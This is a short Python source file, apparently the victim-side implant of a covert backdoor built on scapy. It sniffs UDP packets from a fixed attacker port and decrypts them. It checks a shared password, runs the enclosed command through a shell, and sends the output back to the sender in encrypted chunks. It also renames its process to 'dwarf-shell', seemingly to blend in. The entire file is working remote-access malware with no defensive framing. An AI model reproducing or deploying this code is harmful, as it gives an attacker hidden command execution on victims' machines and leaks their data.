from scapy.all import *
from crypto import *
from config import *
from time import sleep
import setproctitle

def sniff_callback(packet):
    if packet.haslayer(Raw):
        payload = decrypt(packet['Raw'].load)
        password_length = len(PASSWORD)

        if payload[0:password_length] != PASSWORD:
            return

        watch_file = int(payload[password_length])

        command = payload[password_length + 1:len(payload)]
        empty_packet = IP(dst=packet[IP].src) / UDP(sport=VICTIM_PORT, dport=ATTACKER_PORT)

        if watch_file:
            print("watch file")
            print command
        else:
            proc = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
            output = proc.stdout.read() + "\n" + proc.stderr.read()

            max_length = 1000
            chunks = (len(output) / max_length) + 1

            for i in range(0, chunks):
                pkt = empty_packet / encrypt(
                    PASSWORD + output[(max_length * i): min((max_length + (max_length * i)), len(output))]
                )
                sleep(1)
                send(pkt)
        sleep(1)
        send(empty_packet / encrypt("finished"))

def main():
    setproctitle.setproctitle("dwarf-shell")
    sniff(prn=sniff_callback, filter="udp and dst port " + str(VICTIM_PORT) + " and src port " + str(ATTACKER_PORT))
if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print('Bye...')
